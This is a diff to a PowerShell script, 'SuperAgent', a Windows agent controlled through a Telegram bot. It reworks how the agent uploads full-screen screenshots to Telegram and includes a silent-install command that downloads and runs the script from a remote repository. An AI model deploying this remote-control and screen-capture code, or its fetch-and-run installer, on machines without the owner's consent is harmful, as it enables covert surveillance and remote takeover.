@@ -1,14 +1,14 @@
 # =====================================================================
 # SuperAgent - Telegram-controlled Windows agent (single-file)
-# Version: 2.2.4
+# Version: 2.2.5
 # =====================================================================
-# CHANGELOG 2.2.4:
-# - FIXED /screenshot: replaced full C# class compilation with
-#   Add-Type -MemberDefinition (P/Invoke only). Avoids the
-#   "COMPILER_ERRORS" from missing System.Drawing reference.
-# - Improved user-session script error logging: now includes
-#   InnerException + ScriptStackTrace.
-# - Screenshot now logs file size on success (verify real image).
+# CHANGELOG 2.2.5:
+# - Replaced curl.exe in Send-TelegramPhoto with System.Net.Http.HttpClient.
+#   curl.exe was hanging for 60 seconds (timeout) on Windows 11 and
+#   silently dropping the upload.
+# - Added fallback to sendDocument if sendPhoto fails (e.g. image
+#   dimensions too large for Telegram's photo API).
+# - Added Write-Log to capture exact Telegram API responses.
 # =====================================================================
 [CmdletBinding()]
 param(
@@ -130,7 +130,7 @@ $InstallBlock = {
     if ($RepoUrl -match 'USERNAME/REPO') { throw '!!! $RepoUrl NOT UPDATED !!!' }
 
     Write-Msg ''
-    Write-Msg '=== SuperAgent Installer (v2.2.4) ===' -Color Cyan
+    Write-Msg '=== SuperAgent Installer (v2.2.5) ===' -Color Cyan
     Write-Msg "  PC Name  : $PCName"
     Write-Msg "  Chat ID  : $ChatId"
     Write-Msg "  Repo URL : $RepoUrl"
@@ -193,7 +193,7 @@ $InstallBlock = {
         ChatId      = $ChatId
         PCName      = $PCName
         RepoUrl     = $RepoUrl.TrimEnd('/')
-        Version     = '2.2.4'
+        Version     = '2.2.5'
         InstalledAt = (Get-Date -Format 'o')
     }
     $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
@@ -223,7 +223,7 @@ $InstallBlock = {
     Start-ScheduledTask -TaskName $TaskName
 
     Write-Msg ''
-    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.4)' -Color Green
+    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.5)' -Color Green
     Write-Msg "    Log: $LogPath" -Color Green
     Write-Msg ''
     if (-not $Silent) { Pause-Exit }
@@ -377,14 +377,64 @@ public static class SuperAgentUserSession
         }
     }
 
+    # =================================================================
+    # FIXED v2.2.5: Send-TelegramPhoto using HttpClient (no curl.exe)
+    # =================================================================
     function Send-TelegramPhoto {
         param([string]$FilePath, [string]$Caption = '')
-        if (-not (Test-Path $FilePath)) { Send-Telegram "[$PCName] Image file not found"; return }
-        $url = "https://api.telegram.org/bot$BotToken/sendPhoto"
-        $capArg = if ($Caption) { "-F `"caption=$Caption`"" } else { '' }
-        $cmd = "curl.exe -s -m 60 -X POST `"$url`" -F `"chat_id=$ChatId`" $capArg -F `"photo=@$FilePath`""
-        try { Invoke-Expression $cmd | Out-Null }
-        catch { Send-Telegram "[$PCName] Failed to send image: $($_.Exception.Message)" }
+        if (-not (Test-Path $FilePath)) {
+            Send-Telegram "[$PCName] Image file not found: $FilePath"
+            return
+        }
+
+        try {
+            Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
+            $url = "https://api.telegram.org/bot$BotToken/sendPhoto"
+            $client = New-Object System.Net.Http.HttpClient
+            $client.Timeout = [TimeSpan]::FromSeconds(60)
+            
+            $form = New-Object System.Net.Http.MultipartFormDataContent
+            $form.Add((New-Object System.Net.Http.StringContent($ChatId)), 'chat_id')
+            if ($Caption) {
+                $form.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
+            }
+            
+            $fileStream = [System.IO.File]::OpenRead($FilePath)
+            $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+            $form.Add($fileContent, 'photo', (Split-Path $FilePath -Leaf))
+            
+            $response = $client.PostAsync($url, $form).Result
+            $responseString = $response.Content.ReadAsStringAsync().Result
+            
+            Write-Log "sendPhoto status: $($response.StatusCode) | body: $responseString"
+            
+            if (-not $response.IsSuccessStatusCode) {
+                Write-Log "sendPhoto failed, trying sendDocument..."
+                $urlDoc = "https://api.telegram.org/bot$BotToken/sendDocument"
+                $formDoc = New-Object System.Net.Http.MultipartFormDataContent
+                $formDoc.Add((New-Object System.Net.Http.StringContent($ChatId)), 'chat_id')
+                if ($Caption) {
+                    $formDoc.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
+                }
+                $fileStream.Position = 0
+                $fileContentDoc = New-Object System.Net.Http.StreamContent($fileStream)
+                $formDoc.Add($fileContentDoc, 'document', (Split-Path $FilePath -Leaf))
+                
+                $responseDoc = $client.PostAsync($urlDoc, $formDoc).Result
+                $responseDocString = $responseDoc.Content.ReadAsStringAsync().Result
+                Write-Log "sendDocument status: $($responseDoc.StatusCode) | body: $responseDocString"
+                
+                if (-not $responseDoc.IsSuccessStatusCode) {
+                    Send-Telegram "[$PCName] Failed to send file. Status: $($responseDoc.StatusCode)"
+                }
+            }
+        } catch {
+            Write-Log "Send-TelegramPhoto EXCEPTION: $($_.Exception.Message)"
+            Send-Telegram "[$PCName] Failed to send image (exception): $($_.Exception.Message)"
+        } finally {
+            if ($fileStream) { $fileStream.Dispose() }
+            if ($client) { $client.Dispose() }
+        }
     }
 
     function Wait-Network {
@@ -469,10 +519,6 @@ public static class SuperAgentUserSession
         return $result
     }
 
-    # =================================================================
-    # FIXED SCREENSHOT — no full C# class compile
-    # Uses Add-Type -MemberDefinition for P/Invoke (no -ReferencedAssemblies needed)
-    # =================================================================
     function Invoke-Screenshot {
         $outFile   = Join-Path $env:windir "Temp\shot_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$(Get-Random).png"
         $tmpScript = Join-Path $env:windir "Temp\_shot_$(Get-Random).ps1"
@@ -483,10 +529,7 @@ public static class SuperAgentUserSession
         $scriptContent = @"
 param([string]`$OutPath)
 try {
-    # Load Drawing for Bitmap / Graphics / ImageFormat
     Add-Type -AssemblyName System.Drawing
-
-    # P/Invoke (MemberDefinition only - no full C# class compile)
     `$sig = @'
 [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
 [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
@@ -494,10 +537,10 @@ try {
     `$native = Add-Type -MemberDefinition `$sig -Name ScreenMetrics -Namespace SuperAgentNative -PassThru
     `$null = `$native::SetProcessDPIAware()
 
-    `$x = `$native::GetSystemMetrics(76)   # SM_XVIRTUALSCREEN
-    `$y = `$native::GetSystemMetrics(77)   # SM_YVIRTUALSCREEN
-    `$w = `$native::GetSystemMetrics(78)   # SM_CXVIRTUALSCREEN
-    `$h = `$native::GetSystemMetrics(79)   # SM_CYVIRTUALSCREEN
+    `$x = `$native::GetSystemMetrics(76)
+    `$y = `$native::GetSystemMetrics(77)
+    `$w = `$native::GetSystemMetrics(78)
+    `$h = `$native::GetSystemMetrics(79)
 
     if (`$w -le 0 -or `$h -le 0) { throw "Invalid screen bounds: `${w}x`${h} at (`${x},`${y})" }
 
@@ -578,7 +621,7 @@ try {
 try {
     Add-Type -AssemblyName System.Windows.Forms
     'START' | Out-File '$statusFile' -Encoding UTF8 -Force
-    [System.Windows.Forms.MessageBox]::Show('$safe', 'Windows Message', 'OK', 'Information') | Out-Null
+    [System.Windows.Forms.MessageBox]::Show('$safe', 'SuperAgent Message', 'OK', 'Information') | Out-Null
     'DONE'  | Out-File '$statusFile' -Encoding UTF8 -Force
 } catch {
     ("ERR: " + `$_.Exception.Message) | Out-File '$statusFile' -Encoding UTF8 -Force
@@ -878,7 +921,7 @@ if ($Run) {
 
 if (-not $Silent) {
     Write-Msg ''
-    Write-Msg '=== SuperAgent v2.2.4 - Usage ===' -Color Cyan
+    Write-Msg '=== SuperAgent v2.2.5 - Usage ===' -Color Cyan
     Write-Msg ''
     Write-Msg 'Install (silent):'
     Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
